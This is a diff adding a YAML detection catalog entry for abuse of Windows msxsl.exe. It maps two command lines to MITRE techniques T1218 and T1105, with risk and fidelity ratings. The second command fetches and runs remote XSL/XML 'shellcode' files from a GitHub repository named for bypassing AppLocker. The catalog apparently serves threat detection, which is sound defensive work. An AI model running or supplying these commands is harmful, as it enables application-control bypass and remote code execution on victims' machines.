@@ -1,0 +1,40 @@
+- command: msxsl.exe customers.xml script.xsl
+  description: Abuse msxsl.exe to execute COM Scriptlet code contained within script.xsl.
+  killchain:
+    - Actions on Objectives
+  mitre:
+    Defense Evasion:
+      - T1218
+  os:
+    - Windows
+  references:
+    - https://lolbas-project.github.io/lolbas/OtherMSBinaries/Msxsl/
+  risk: High
+  risk_reason: Manual usage of msxsl in this manner is suspicious.
+  fidelity: High
+  fidelity_reason: This type of activity is typically rare in most organizations.
+  tool: msxsl
+  threatactors:
+    N/A:
+      - N/A
+- command: msxsl.exe https://raw.githubusercontent.com/3gstudent/Use-msxsl-to-bypass-AppLocker/master/shellcode.xml https://raw.githubusercontent.com/3gstudent/Use-msxsl-to-bypass-AppLocker/master/shellcode.xsl
+  description: Abuse msxsl.exe to execute COM Scriptlet code contained within a remotely hosted file.
+  killchain:
+    - Actions on Objectives
+  mitre:
+    Defense Evasion:
+      - T1218
+    Command and Control:
+      - T1105
+  os:
+    - Windows
+  references:
+    - https://lolbas-project.github.io/lolbas/OtherMSBinaries/Msxsl/
+  risk: High
+  risk_reason: Manual usage of msxsl in this manner is suspicious, especially with remote files.
+  fidelity: High
+  fidelity_reason: This type of activity is typically rare in most organizations.
+  tool: msxsl
+  threatactors:
+    N/A:
+      - N/A
